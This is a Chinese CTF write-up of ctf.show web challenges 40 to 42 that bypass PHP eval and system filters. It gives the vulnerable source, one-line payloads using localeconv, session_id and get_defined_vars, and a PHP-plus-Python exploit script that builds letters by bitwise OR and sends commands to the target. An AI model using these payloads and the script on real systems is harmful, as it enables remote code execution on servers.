<h3 id="Web40（无数字RCE）"><a href="#Web40（无数字RCE）" class="headerlink" title="Web40（无数字RCE）"></a>Web40（无数字RCE）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 06:03:36</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ban掉了很多符号，比如引号，美元符等，但是注意的是他过滤的是中文的括号，没有过滤英文的()</p>
<p><strong>方法一：</strong></p>
<p>先介绍下列几组函数</p>
<ul>
<li>localeconv()：函数返回包含本地数字及货币信息格式的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%95%B0%E7%BB%84">数组</a>。如下图</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663347074453-5a70e485-5d01-4f78-840b-b73f8a58e400.png#averageHue=%23f9f9f8&clientId=u79439bbc-4f42-4&from=paste&height=268&id=uc62a6add&name=image.png&originHeight=335&originWidth=1203&originalType=binary&ratio=1&rotation=0&showTitle=false&size=156659&status=done&style=none&taskId=uc8aaab5d-b6d2-40f3-ad95-52d7b69aabe&title=&width=962.4" alt="image.png"></p>
<ul>
<li>pos()或者current()：输出数组的第一个元素，如图：由于localeconv函数第一个元素是一个.，所以输出了一个.</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663347089365-73d5baf4-e127-4f9f-857f-86e0058909db.png#averageHue=%23d5c7b7&clientId=u79439bbc-4f42-4&from=paste&height=170&id=u0f100a38&name=image.png&originHeight=213&originWidth=1157&originalType=binary&ratio=1&rotation=0&showTitle=false&size=79913&status=done&style=none&taskId=u6773d0a7-fc6b-45a5-9a46-ac1cc1b8ec8&title=&width=925.6" alt="image.png"></p>
<ul>
<li>scandir():以数组的形式列出指定路径中的文件和目录，这里.代表的是当前目录</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663347100935-fd7f8340-0844-4ec1-a28f-69648d448c6a.png#averageHue=%23fcfcfb&clientId=u79439bbc-4f42-4&from=paste&height=298&id=u533d22af&name=image.png&originHeight=372&originWidth=1192&originalType=binary&ratio=1&rotation=0&showTitle=false&size=92753&status=done&style=none&taskId=ubc87aa6c-d1df-448a-85ed-a4c6be316af&title=&width=953.6" alt="image.png"></p>
<ul>
<li>array_reverse()：将数组倒叙排列</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663347120837-dade0a75-747a-4779-b9ee-24323a5f4ae3.png#averageHue=%23fcfcfb&clientId=u79439bbc-4f42-4&from=paste&height=326&id=ua6c188ff&name=image.png&originHeight=408&originWidth=1173&originalType=binary&ratio=1&rotation=0&showTitle=false&size=99959&status=done&style=none&taskId=uc76d414a-b1f4-4c7c-9774-b9f145a01f8&title=&width=938.4" alt="image.png"></p>
<ul>
<li>next():将数组中的内部指针向前移动一位 ，并且输出，也就是输出第二个元素 </li>
<li>show_source()也就是highlight_file():高亮显示代码</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663347149889-1c284011-fb38-43ea-a34a-1d9e6e2ca7d4.png#averageHue=%23fcfcfb&clientId=u79439bbc-4f42-4&from=paste&height=378&id=u4314cd38&name=image.png&originHeight=472&originWidth=1181&originalType=binary&ratio=1&rotation=0&showTitle=false&size=142431&status=done&style=none&taskId=u1c1110dc-046a-4ef9-bda5-cf0bd5cb08d&title=&width=944.8" alt="image.png"></p>
<p>所以payload1&#x3D;?c&#x3D;show_source((next(array_reverse(scandir(pos(localeconv()))))));</p>
<p><strong>方法二：</strong></p>
<p>payload2&#x3D;?c&#x3D;session_start();system(session_id());</p>
<p>其中session_start意思是开启一个对话，会多一个PHPSESSID，这个参数我们可以修改</p>
<p>然后session_id就是获取PHPSESSID的,也就是如图、</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663347190266-369a32e7-b60d-4b0c-95f2-3f78ca4c7b6c.png#averageHue=%23faf9f9&clientId=u79439bbc-4f42-4&from=paste&height=360&id=u11de937b&name=image.png&originHeight=450&originWidth=1209&originalType=binary&ratio=1&rotation=0&showTitle=false&size=170236&status=done&style=none&taskId=u9a225392-4ed2-467f-959e-54b3fdb37aa&title=&width=967.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663347198592-9097da1b-f58f-4f2c-8913-304872d48403.png#averageHue=%23cec1b4&clientId=u79439bbc-4f42-4&from=paste&height=298&id=u0e3271c9&name=image.png&originHeight=372&originWidth=1169&originalType=binary&ratio=1&rotation=0&showTitle=false&size=99613&status=done&style=none&taskId=u6ab4ebc5-63c1-4a63-a1bb-03c0b1c1ad1&title=&width=935.2" alt="image.png"></p>
<p><strong>方法三</strong>：</p>
<p>使用post进行rec远程执行，showtime！首先介绍以下几个函数</p>
<ul>
<li>get_defined_vars()：此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量，效果图如下：</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663347272622-ab0895d9-8b31-45e6-b6d9-55d16271cd4c.png#averageHue=%23fcfcfc&clientId=u79439bbc-4f42-4&from=paste&height=322&id=u744a606f&name=image.png&originHeight=402&originWidth=1187&originalType=binary&ratio=1&rotation=0&showTitle=false&size=79089&status=done&style=none&taskId=u3b710f98-e703-4d98-b7ec-df2239b6420&title=&width=949.6" alt="image.png"></p>
<ul>
<li>仔细看第二个[_POST]里面没有参数，所以我们用POST方法给他传进去一个试试看<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663347278317-30841886-4926-480d-b0e7-d5ae78f9c785.png#averageHue=%23fdfcfc&clientId=u79439bbc-4f42-4&from=paste&height=450&id=uac44ca6c&name=image.png&originHeight=562&originWidth=1191&originalType=binary&ratio=1&rotation=0&showTitle=false&size=98325&status=done&style=none&taskId=ub21292b8-8998-4f79-8770-af994ff742a&title=&width=952.8" alt="image.png"><br>如图所示，已经多了一个参数phpinfo（） </li>
<li>接下来用next函数，获取第二个元素</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663347297413-3d263466-305b-4eb7-94ab-68177d37a0b3.png#averageHue=%23fcfcfc&clientId=u79439bbc-4f42-4&from=paste&height=526&id=u0b08c9a6&name=image.png&originHeight=657&originWidth=1177&originalType=binary&ratio=1&rotation=0&showTitle=false&size=116193&status=done&style=none&taskId=u23998406-1c6d-435b-b469-10113add539&title=&width=941.6" alt="image.png"></p>
<ul>
<li>array_pop():返回数组最后一个元素的值，这里也可以用pos和curren函数</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663347379725-ce584a5a-8713-4e33-9e76-6e1ed76316e8.png#averageHue=%23fdfcfc&clientId=u79439bbc-4f42-4&from=paste&height=601&id=u0f83a3f5&name=image.png&originHeight=751&originWidth=1278&originalType=binary&ratio=1&rotation=0&showTitle=false&size=132973&status=done&style=none&taskId=u20d9e116-2035-4845-9d00-b558ea2dfc0&title=&width=1022.4" alt="image.png"></p>
<ul>
<li>最后把print改为eval进行执行，如图所示进入了phpinfo界面，并且那个1&#x3D;phpinfo()末尾要加分号，eval函数末尾必须要有分号</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663347391308-f842d87b-f46f-43d1-8afa-3ec7efdb0e81.png#averageHue=%23bfb5aa&clientId=u79439bbc-4f42-4&from=paste&height=418&id=ud1a6b442&name=image.png&originHeight=522&originWidth=1179&originalType=binary&ratio=1&rotation=0&showTitle=false&size=164582&status=done&style=none&taskId=ub33e6794-cb04-4fbd-8e37-f7b85561779&title=&width=943.2" alt="image.png"></p>
<ul>
<li>最后要获得flag，把1的参数改为1&#x3D;system(‘tac flag.php’);得到flag</li>
</ul>
<h3 id="Web41（无数字字母RCE）"><a href="#Web41（无数字字母RCE）" class="headerlink" title="Web41（无数字字母RCE）"></a>Web41（无数字字母RCE）</h3><p>JOKE</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 羽</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:31:22</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-05 22:40:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: 1341963450<span class="doctag">@qq</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctf.show</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);    <span class="comment">//该ban的都给你ban完了，字母都没了就别想着用字母秀了号码，OK?</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>SO今天我们使用的是一款全新的工具，没错PHP+PY脚本，首先我门先写一个PHP脚本如下OK?：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);  <span class="comment">//新创建一个文件，也就是rce_or.txt，给他写的权限</span></span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>); <span class="comment">//ascii的前16个字符的十六进制应该是01，02，所以在前缀加‘0’</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);  <span class="comment">//前16个后面的就不用加0了</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);   <span class="comment">//同理上方</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);      <span class="comment">//同理上方</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;     <span class="comment">//如果有符合条件的就筛掉，输出空格</span></span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;             <span class="comment">//可以使用的字符如下</span></span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;    <span class="comment">//十六进制前加百分号就变成了URL编码格式</span></span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));  <span class="comment">//urldecode函数是解URL编码，把他们变成字符串，这里是字符串进行按位或运算，按位或运算后，可以得到新的字符，如%21和%00进行按位或就变成了!,这样我们就可以使用感叹号,就类似于合成新的字符</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;          <span class="comment">//ord函数是将字符变成ASCII码</span></span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;     <span class="comment">//每次到这里都写入刚刚建立的文本内</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/347fca1493ab4f9696d6562b96bc259b.png#id=NCwKe&originHeight=231&originWidth=217&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
<p>跟这张图一样的感觉，%00和%21变成了！，%00 %22变成了#，当然还有其他的可以合成字母，也就是我们的目的，我们的目的就是合成字母，然后使用函数</p>
<p>NEXT，编造一个py脚本：如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests    //request函数库</span><br><span class="line"><span class="keyword">import</span> urllib           //urllib函数库</span><br><span class="line"><span class="comment">#from sys import *</span></span><br><span class="line"><span class="comment">#os.system(&quot;php or_getfun.php&quot;)  #没有将php写入环境变量的需手动运行   //这一块注释掉的就是打开php文件</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(argv)!=<span class="number">2</span>)<span class="comment">#未传够2个参数的，会给提示</span></span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;USER:python exp.py http://65d9abec-9d41-453d-b48d-bf60ef9fe78c.chall.ctf.show/&#x27;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   exit(<span class="number">0</span>)</span><br><span class="line">url=argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;rce_or.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()<span class="comment">#逐行读取文件 //每一次循环，指针都会指向下一行，输出下一行的字符</span></span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:<span class="comment">#读到空，即读完跳出循环</span></span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:       <span class="comment">#就比如我们这边输入的arg是system，当文本当前行第一个字母是s或者y这些字符就写入s1,s2</span></span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]<span class="comment">#提取第一个字符串，具体可以看上面我的截图，如第一行的%00</span></span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]<span class="comment">#提取第二个字符串</span></span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span>   <span class="comment">#s1和s2进行或运算就可以合成对应的字母s,y,s,t,e,m</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function:&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command:&quot;</span>))</span><br><span class="line">   data=&#123;</span><br><span class="line">       <span class="string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)   <span class="comment">#对URL编码进行解码，答案就出来了，python传递的是报文</span></span><br><span class="line">       &#125;</span><br><span class="line">   r=requests.post(url,data=data)<span class="comment">#post传递，若是get就get传递</span></span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span>+r.text)    <span class="comment">#输出结果</span></span><br></pre></td></tr></table></figure>

<p>当我想看<code>php或运算</code>是怎么工作的时候，我首先对param和post请求的data进行打印。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">   param=<span class="title function_ invoke__">action</span>(<span class="title function_ invoke__">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+<span class="title function_ invoke__">action</span>(<span class="title function_ invoke__">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))</span><br><span class="line">   <span class="keyword">print</span>(param)</span><br><span class="line">   </span><br><span class="line">   data=&#123;</span><br><span class="line">       <span class="string">&#x27;c&#x27;</span>:urllib.parse.<span class="title function_ invoke__">unquote</span>(param)</span><br><span class="line">       &#125;</span><br><span class="line">   <span class="keyword">print</span>(data)</span><br><span class="line">   r=requests.<span class="title function_ invoke__">post</span>(url,data=data)</span><br><span class="line">   <span class="keyword">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span>+r.text)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663347565645-8defc612-9293-4b5e-ba02-b0dfbb6ad8e2.png#averageHue=%232c313a&clientId=u79439bbc-4f42-4&from=paste&height=228&id=ue7338613&name=image.png&originHeight=285&originWidth=1039&originalType=binary&ratio=1&rotation=0&showTitle=false&size=100351&status=done&style=none&taskId=u831ea781-59a1-4168-9ed0-6f070efc0b1&title=&width=831.2" alt="image.png"></p>
<p>我开始好奇这个指令是怎么通过前端发给后端的，于是我复制了第一行的编码在Hackber里发送。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663347573781-80721e7a-ee61-449c-b1a7-0bd9cfbc7b0a.png#averageHue=%23fbfbfb&clientId=u79439bbc-4f42-4&from=paste&height=623&id=uf696e916&name=image.png&originHeight=779&originWidth=1207&originalType=binary&ratio=1&rotation=0&showTitle=false&size=124603&status=done&style=none&taskId=u5e1c5c14-776b-4198-96ef-ec68db99ee7&title=&width=965.6" alt="image.png"></p>
<p>发现报错，我换了其他格式和其他编码还是不行。。。</p>
<p>我开始怀疑是不是<code>()</code>、<code>%</code>等等的符号不能被编码，因为本来php的异或运算也不是用<code>%13</code>等等数值，而是<code>%13</code>等编码对应的ASCII值！！<br>比如像有些特殊字符是输入不出来的，具体看ASCII表</p>
<p><strong>而param中的字符串很有可能是发送的报文，事实也证实了猜想。</strong></p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663348790567-5d35dec1-70ee-442e-87fe-dbd4577aa94a.png#averageHue=%23f8f7f7&clientId=u52f2ed63-d88c-4&from=paste&height=385&id=uc7df34a8&name=image.png&originHeight=481&originWidth=1214&originalType=binary&ratio=1&rotation=0&showTitle=false&size=180973&status=done&style=none&taskId=uc7039a38-0719-4a55-8857-24f95468694&title=&width=971.2" alt="image.png"></p>
<p>显然特殊字符被编码的，而我们发送到Repeater，修改一下，发现显示出来了</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663348796082-711680a8-e8c6-4903-8378-ee9987764759.png#averageHue=%23f9f8f8&clientId=u52f2ed63-d88c-4&from=paste&height=422&id=u55a2025d&name=image.png&originHeight=528&originWidth=1203&originalType=binary&ratio=1&rotation=0&showTitle=false&size=197224&status=done&style=none&taskId=uec69a76b-e61a-4acb-8ad1-f8a1c6d0d36&title=&width=962.4" alt="image.png"></p>
<p>所以，这更加深刻了我对<strong>python的相关代码是直接构造报文发送给后端</strong>的理解</p>
<h3 id="Web42（双写绕过，黑洞）"><a href="#Web42（双写绕过，黑洞）" class="headerlink" title="Web42（双写绕过，黑洞）"></a>Web42（双写绕过，黑洞）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-05 20:51:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);   <span class="comment">//本局重点</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们来说一下本题重点**$c.” &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”**的意思：</p>
<hr>
<blockquote>
<p>代表重定向到哪里，例如：echo “123” &gt; &#x2F;home&#x2F;123.txt<br>1 表示stdout标准输出，系统默认值是1，所以”&gt;&#x2F;dev&#x2F;null”等同于”1&gt;&#x2F;dev&#x2F;null”<br>2 表示stderr标准错误<br>&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1</p>
</blockquote>
<hr>
<p><strong>那么本文标题的语句：</strong><br>1&gt;&#x2F;dev&#x2F;null 首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，说白了就是不显示任何信息。<br>2&gt;&amp;1 接着，标准错误输出重定向等同于 标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。</p>
<hr>
<p>其中本题中的$c相当于我们的command也就是指令,<strong>这里system内部命令不需要加引号</strong>，这里我们可以用<strong>双写绕过</strong></p>
